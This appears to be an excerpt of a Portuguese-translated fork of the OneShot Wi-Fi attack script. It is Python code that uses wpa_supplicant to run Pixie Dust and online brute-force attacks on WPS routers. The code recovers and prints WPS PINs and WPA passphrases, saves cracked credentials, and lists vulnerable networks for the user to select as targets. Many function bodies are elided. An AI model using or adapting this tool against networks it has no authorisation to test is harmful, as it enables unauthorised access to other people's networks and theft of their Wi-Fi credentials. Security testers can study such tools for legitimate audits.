...
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            ...
            raise ValueError('O endereço MAC deve ser string ou número inteiro')
...
class Companion:
    ...
    def __init_wpa_supplicant(self):
        print('[*] Iniciando wpa_supplicant…')
    ...
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'COMANDO NAO ENCONTRADO':
                return ('[!] Parece que seu wpa_supplicant foi compilado sem suporte ao protocolo WPS. '
                        'Por favor, crie wpa_supplicant com suporte WPS ("CONFIG_WPS=y")')
        return '[!] Algo deu errado  — verifique o log de depuração.'
    ...
    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        ...
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                ...
                print('[*] Enviando mensagem WPS M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print('[*] Mensagem WPS recebida M{}'.format(n))
                if n == 5:
                    print('[+] A primeira metade do PIN é válida')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print('[*] WSC recebida NACK')
                print('[-] Erro: código PIN errado')
            ...
            print('[-] wpa_supplicant retornou WPS-FAIL')
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associando-se com AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] Associando-se {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[+] Associado com {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] Iniciando envio de EAPOL…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Solicitação de identidade recebida')
        elif 'using real identity' in line:
            print('[*] Enviando resposta de identidade…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selecionando AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print("[*] Iniciando Pixiewps…")
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] \033[93mWPS PIN:\033[0m '{wps_pin}'")
        print(f"[+] \033[91mWPA PSK:\033[0m '{wpa_psk}'")
        print(f"[+] \033[92mAP SSID:\033[0m '{essid}'")
    ...
    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        ...
        print(f'[i] Credenciais salvas em {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN salvo em {}'.format(filename))
    ...
    def __prompt_wpspin(self, bssid):
        ...
        if len(pins) > 1:
            ...
            pin = pins[0]
            print('[i] O único PIN provável está selecionado:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin
    ...
    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        ...
        if pbc_mode:
            if bssid:
                print(f"[*] Iniciando a conexão do botão WPS para {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Iniciando a conexão do botão WPS…")
                cmd = 'WPS_PBC'
        else:
    ...
    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
            ...
            if pixiemode:
                try:
                    ...
                    with open(filename, 'r') as file:
                        ...
                        if input('[?] Usar PIN calculado anteriormente {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
        ...
        if self.connection_status.status == 'GOT_PSK':
            ...
            if self.pixie_creds.got_all():
                ...
                print('[!] Dados insuficientes para executar o ataque Pixie Dust')
                return False
        else:
    ...
    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            ...
            try:
                ...
                with open(filename, 'r') as file:
                    if input('[?] Restaurar sessão para anterior  {}? [n/Y] '.format(bssid)).lower() != 'n':
        ...
        try:
            ...
            print('[i] Sessão salva em {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt
...
class WiFiScanner:
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        if self.vuln_list:
            print('Network marks: {1} {0} {2} {0} {3}'.format(
                '|',
                colored('> Possibilidade de Ataque <', color='green'),
                colored('> WPS Desabilitado/Protegido <', color='red'),
                colored('> Rede Crackeada/Salva <', color='yellow')
            ))
        print('\033[92mREDES DISPONIVEIS PARA TESTE =) :\033[0m')
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            print('[-] Redes nao encontradas.')
            return
        while 1:
            try:
                networkNo = input('\033[96mSelecione o alvo (pressione Enter para atualizar):\033[0m ')
...
OneShotPy 0.0.2br (c) 2024
                         ("\033[91m ######################################################\033[0m")
("\033[91m >>>>>>>>>>\033[0m") ("\033[91mModificado e traduzido por NÓIA_ROOT\033[0m") ("\033[91m<<<<<<<<<<\033[0m")
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(
        description='\033[91mOneShotPy 0.0.2br (c) 2024\033[0m' '\033[94m>> Traduzido e modificado por NÓIA_ROOT << 30/01/24\033[0m',
        epilog='\033[93mExemplo: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K\033[0m  '
        )
    ...
    parser.add_argument(
        ...
        type=str,
        required=True,
        help='Nome da interface a ser usada'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID do AP alvo'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use o pin especificado (string arbitrária ou pino de 4/8 dígitos)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Executa o ataque Pixie Dust'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Executa Pixiewps com a opção --force (força bruta)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Sempre imprima o comando Pixiewps'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Executa um ataque de força bruta online'
        )
    parser.add_argument(
        '--pbc', '--push-button-connect',
        action='store_true',
        help='Executa a conexão do botão WPS'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Defina o atraso entre as tentativas de ataque'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Grave credenciais no arquivo em caso de sucesso'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Interface de rede desligada quando o trabalho for concluído'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use arquivo personalizado com lista de dispositivos vulneráveis'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='correr em ciclos '
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Ordem inversa das redes na lista de redes. Útil em telas pequenas'
    )
    parser.add_argument(
        '--mtk-wifi',
        action='store_true',
        help='Ative o driver da interface Wi-Fi MediaTek na inicialização e desative-o ao sair '
             '(Para adaptadores Wi-Fi internos implementados em SoCs MediaTek). '
             'Desligue o Wi-Fi nas configurações do sistema antes de usar este.'
    )
    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
    ...
    if sys.hexversion < 0x03060F0:
        die("Este programa requer Python 3.6 ou superior.")
    if os.getuid() != 0:
        die("\033[91mAcesse como ROOT!!\033[0m")

    if args.mtk_wifi:
        wmtWifi_device = Path("/dev/wmtWifi")
        if not wmtWifi_device.is_char_device():
            die("Não é possível ativar o dispositivo de interface Wi-Fi MediaTek (--mtk-wifi): "
                "/dev/wmtWifi não existe ou não é um dispositivo compativel ")
        wmtWifi_device.chmod(0o644)
        wmtWifi_device.write_text("1")

    if not ifaceUp(args.interface):
        die('Não foi possível atualizar a interface "{}"'.format(args.interface))
        ...
        try:
            ...
            if args.pbc:
                ...
                if not args.bssid:
                    ...
                    if not args.loop:
                        print('\033[93m[*] BSSID não especificada (--bssid) — Procurando redes disponíveis\033[0m')
            ...
            if args.loop:
                if input("\n[?] Saia do script (caso contrário, continue com a varredura do AP)? [N/y] ").lower() == 'y':
                    print("\033[91mAbortando…\033[0m")
                    break
                else:
                    args.bssid = None
            else:
